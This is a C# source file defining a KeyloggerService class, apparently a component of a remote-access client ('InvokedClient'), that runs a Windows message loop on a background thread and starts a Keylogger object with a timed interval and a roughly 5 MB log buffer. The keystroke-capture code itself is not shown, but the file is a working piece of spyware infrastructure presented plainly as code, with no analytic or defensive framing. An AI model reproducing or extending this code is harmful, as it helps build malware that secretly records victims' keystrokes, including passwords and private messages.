

using System;
using System.Threading;
using System.Windows.Forms;


namespace InvokedClient.Logging
{
	public class KeyloggerService : IDisposable
	{
		private readonly Thread _msgLoopThread;
		private ApplicationContext _msgLoop;
		private Keylogger _keylogger;

		public KeyloggerService()
		{
			this._msgLoopThread = new Thread((ThreadStart)(() =>
			{
				this._msgLoop = new ApplicationContext();
				this._keylogger = new Keylogger(15000.0, 5242880L);
				this._keylogger.Start();
				Application.Run(this._msgLoop);
			}));
		}

		public void Start() => this._msgLoopThread.Start();

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this._keylogger.Dispose();
			this._msgLoop.ExitThread();
			this._msgLoop.Dispose();
		}
	}
}